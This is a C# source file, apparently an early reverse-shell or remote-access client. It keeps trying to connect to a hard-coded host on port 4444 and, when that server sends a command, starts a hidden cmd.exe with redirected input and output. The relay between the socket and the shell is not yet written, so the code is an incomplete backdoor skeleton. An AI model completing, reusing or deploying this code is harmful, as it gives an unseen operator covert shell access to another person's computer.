using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Client1
{
    internal class Program
    {
        private static Process process = null; // הגדרת המשתנה process ברמה הגלובלית

        static void Main()
        {
            string serverIP = "10.0.0.33"; // Replace with your server's IP address
            int port = 4444;
            TcpClient client = null;
            NetworkStream stream = null;
            StreamReader reader = null;
            StreamWriter writer = null;

            while (true)
            {
                try
                {
                    client = new TcpClient(serverIP, port);
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Waiting To Connect...");
                }
            }

            while (true)
            {
                string serverResponse = reader.ReadLine();
                if (serverResponse != null)
                {
                    if (serverResponse == "cmd-start")
                    {
                        if (process == null || process.HasExited)
                        {
                            process = Start_Cmd();
                        }
                        Console.WriteLine("cmd-start received");
                        writer.WriteLine("Success");
                    }
                    else if (serverResponse == "cmd-stop")
                    {
                        if (process != null && !process.HasExited)
                        {
                            process.StandardInput.Close();
                            process.Close();
                            process = null;
                        }
                        Console.WriteLine("cmd-stop received");
                        writer.WriteLine("Success");
                    }
                }

            }
        }
        static Process Start_Cmd()
        {
            try
            {  // Execute command and capture its output
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe")
                {
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                };


                Process process = new Process() { StartInfo = psi };
                process.Start();
                return process;
            }catch (Exception ex)
            {
                Console.WriteLine("No");
                return null;
            }
            

        }
    }
}
